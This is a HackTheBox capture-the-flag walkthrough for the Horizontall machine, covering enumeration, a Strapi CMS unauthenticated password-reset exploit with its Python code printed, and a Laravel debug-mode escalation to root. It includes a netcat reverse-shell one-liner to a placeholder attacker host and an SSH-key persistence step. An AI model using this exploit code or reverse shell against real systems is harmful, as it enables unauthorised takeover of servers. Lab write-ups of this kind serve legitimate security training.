---
title: Horizontall
tags: [Strapi, UnauthenticatedRCE]
style: fill
color: info
description: HackTheBox - Medium
---

![infocard](/assets/ctf/htb_media/horizontall_newinfocard.png)

## Introduction

Horizontall is a medium-difficulty machine on HackTheBox that involves exploiting a Strapi CMS vulnerability to gain initial access and leveraging a Laravel vulnerability for privilege escalation. This walkthrough will guide you through the process of compromising the Horizontall machine, from initial reconnaissance to gaining root access.

## Initial Enumeration

### Nmap Scan

The first step in any penetration test is enumeration. We start by scanning the target machine using Nmap to identify open ports and services.

```bash
nmap -sV -sC -oA nmap/initial 10.10.11.105
```

**Nmap Results:**

```nmap
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-12 13:59 EST
Nmap scan report for horizontall.htb (10.10.11.105)
Host is up (0.31s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: horizontall
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.19 seconds
```

**Key Services Identified:**

- **SSH (22):** OpenSSH 7.6p1
- **HTTP (80):** Nginx 1.14.0

### Web Enumeration

Visiting the HTTP service on port 80 revealed a static image. We added `horizontall.htb` to our `/etc/hosts` file to resolve the domain.

![index](/assets/ctf/htb_media/horizontall_indexpage.png)

**Subdomain Enumeration:**

Using `ffuf`, we discovered a subdomain: `api-prod`.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt -u http://horizontall.htb -H "Host:FUZZ.horizontall.htb" -fc 301
```

**Key Subdomain Identified:**

- `api-prod`

**Directory Brute-Forcing:**

We performed directory brute-forcing on the `api-prod` subdomain:

```bash
ffuf -u http://api-prod.horizontall.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

**Key Directories Identified:**

- `/admin`
- `/reviews`
- `/users`

## Exploiting Strapi CMS

### **Analyzing the Exploit Code**

The exploit script follows a structured approach to identify the vulnerability and leverage it for code execution. Let’s break down its functionality.

#### **Script Initialization**

```
if __name__ == ("__main__"):
    url = sys.argv[1]
    if url.endswith("/"):
        url = url[:-1]
    check_version()
    password_reset()
    terminal = Terminal()
    terminal.cmdloop()
```

- The script expects a URL as input.
- It ensures the URL does not end with a trailing `/` to avoid formatting issues.
- It then calls three main functions: `check_version()`, `password_reset()`, and `Terminal()`.

### **Version Check**

The `check_version()` function identifies the Strapi CMS version running on the target system.

```
def check_version():
    global url
    print("[+] Checking Strapi CMS Version running")
    version = requests.get(f"{url}/admin/init").text
    version = json.loads(version)
    version = version["data"]["strapiVersion"]
    if version == "3.0.0-beta.17.4":
        print("[+] Seems like the exploit will work!!!\n[+] Executing exploit\n\n")
    else:
        print("[-] Version mismatch trying the exploit anyway")
```

This function sends a request to `http://api-prod.horizontall.htb/admin/init` to retrieve the Strapi CMS version. To manually verify, we can use:

```
curl http://api-prod.horizontall.htb/admin/init
```

The response confirms that the system runs **version 3.0.0-beta.17.4**, which is vulnerable to **unauthenticated Remote Code Execution**.

### **Password Reset Exploit**

Next, the script attempts to reset the administrator password to gain control.

```
def password_reset():
    global url, jwt
    session = requests.session()
    params = {"code": {"$gt": 0},
              "password": "SuperStrongPassword1",
              "passwordConfirmation": "SuperStrongPassword1"}
    output = session.post(f"{url}/admin/auth/reset-password", json=params).text
    response = json.loads(output)
    jwt = response["jwt"]
    username = response["user"]["username"]
    email = response["user"]["email"]

    if "jwt" not in output:
        print("[-] Password reset unsuccessful\n[-] Exiting now\n\n")
        sys.exit(1)
    else:
        print(f"[+] Password reset was successful\n[+] Your email is: {email}\n[+] Your new credentials are: {username}:SuperStrongPassword1\n[+] Your authenticated JSON Web Token: {jwt}\n\n")
```

- This function sends a request to `http://api-prod.horizontall.htb/admin/auth/reset-password` with a crafted payload to reset the password.
    
- If successful, it retrieves the **JWT token**, **username**, and **email** of the compromised account.
    
- This grants administrative access to the CMS.
### Gaining Initial Access

Executing the exploit provided a reverse shell:

```bash
mkfifo /tmp/lol;nc attacker_ip 1234 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
```

**Reverse Shell Obtained:**

![Reverse Shell](/assets/ctf/htb_media/horizontall_strapishell.png)

### Establishing SSH Access

We added our SSH public key to `/opt/strapi/.ssh/authorized_keys` and accessed the machine via SSH.

## Privilege Escalation

### Enumerating Local Services

Running `linpeas.sh` revealed that ports `1337` and `8000` were listening locally.

**Port Forwarding:**

We forwarded port `8000` to our local machine for further analysis:

```bash
ssh strapi@$ip -L 8000:127.0.0.1:8000
```

### Exploiting Laravel

Visiting `http://127.0.0.1:8000` revealed a Laravel application. Researching Laravel vulnerabilities identified an RCE exploit for Laravel v8.4.2 in debug mode.

**Exploit Execution:**

Using the Laravel exploit, we gained root access.

**Root Shell Obtained:**

![Root Shell](/assets/ctf/htb_media/horizontall_root.txt.png)

## Conclusion

The Horizontall machine on HackTheBox provided a comprehensive challenge, encompassing web application enumeration, Strapi CMS exploitation, and Laravel privilege escalation. By methodically enumerating services, exploiting discovered vulnerabilities, and leveraging local service misconfigurations, we successfully compromised the machine and gained root access. This walkthrough underscores the importance of thorough enumeration and the effective use of discovered vulnerabilities in penetration testing.